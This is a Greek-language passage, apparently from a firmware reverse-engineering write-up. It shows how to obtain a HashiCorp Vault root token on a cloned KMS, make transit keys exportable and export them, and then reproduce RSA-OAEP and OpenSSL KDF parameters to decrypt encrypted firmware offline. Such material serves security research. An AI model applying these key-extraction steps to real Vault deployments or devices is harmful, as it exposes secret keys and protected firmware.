TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Με root στο cloned KMS:

- Κάντε τα transit keys exportable μόνο μέσα στο απομονωμένο clone: `vault write transit/keys/<name>/config exportable=true`
- Εξαγάγετε το unwrap key: `vault read transit/export/encryption-key/<name>`
- Δοκιμάστε το ανακτημένο RSA key με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Αποτυχία αποκρυπτογράφησης με PKCS#1 v1.5 και αποτυχία της προεπιλεγμένης αποκρυπτογράφησης OAEP **δεν** αποδεικνύουν ότι το key είναι λάθος· πολλές ροές που βασίζονται στο Vault χρησιμοποιούν OAEP με SHA-256, ενώ οι συνηθισμένες βιβλιοθήκες έχουν ως προεπιλογή το SHA-1.
- Αν το payload ξεκινά με `Salted__`, αναπαράγετε ακριβώς το OpenSSL KDF του κατασκευαστή (`EVP_BytesToKey`, συχνά MD5 σε παλαιότερες συσκευές) πριν επιχειρήσετε αποκρυπτογράφηση AES-CBC.

Έτσι, το «κρυπτογραφημένο firmware» γίνεται ένα γενικότερο πρόβλημα: **ανακτήστε τα operational keys από την πλευρά της συσκευής και, στη συνέχεια, αναπαράγετε offline τις ακριβείς παραμέτρους unwrap + KDF**.
